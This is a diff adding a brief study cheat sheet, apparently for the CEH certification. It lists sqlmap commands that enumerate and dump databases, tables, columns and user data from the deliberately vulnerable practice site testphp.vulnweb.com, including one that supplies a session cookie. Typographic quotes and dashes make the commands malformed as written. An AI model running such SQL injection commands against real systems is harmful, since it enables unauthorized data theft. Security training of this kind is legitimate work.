@@ -1,0 +1,13 @@
+Use to Ceh
+
+sqlmap -u “http://testphp.vulnweb.com/artists.php?artist=1" –dbs                                                //Find DBs
+
+sqlmap -u “http://testphp.vulnweb.com/artists.php?artist=1" -D DatabaseName –table                              //Find Tables
+
+sqlmap -u “http://testphp.vulnweb.com/artists.php?artist=1" -D DatabaseName -T users –columns                   //Find columns
+
+sqlmap -u “http://testphp.vulnweb.com/artists.php?artist=1" -D DatabaseName -T users –dump                      //Dump table
+
+sqlmap -u “http://testphp.vulnweb.com/artists.php?artist=1" -D DatabaseName –dump-all                           //Dump the DB
+
+sqlmap -u “http://testphp.vulnweb.com/artists.php?artist=1" –cookie=‘JSESSIONID=09h76qoWC559GH1K7DSQHx’ –dbs    //using cookies
